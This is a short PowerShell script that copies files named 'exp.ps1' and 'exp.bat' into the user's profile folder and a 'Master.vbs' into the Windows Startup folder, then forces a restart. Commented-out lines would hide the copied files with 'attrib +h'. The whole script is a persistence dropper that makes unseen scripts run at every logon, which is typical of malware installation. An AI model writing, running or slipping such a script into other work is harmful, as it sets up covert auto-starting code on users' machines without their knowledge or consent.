$d="C:\Users\"
$user=$env:UserName

$f="\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
$dest=$d+$user+$f


$dest2=$d+$user

Copy-Item "src\exp.ps1" -Destination $dest2
Copy-Item "src\exp.bat" -Destination $dest2

Copy-Item "src\Master.vbs" -Destination $dest

#$one=$dest+ "exp.ps1"
#$two=$dest+ "exp.bat"
#attrib +h $one
#attrib +h $two
Restart-Computer


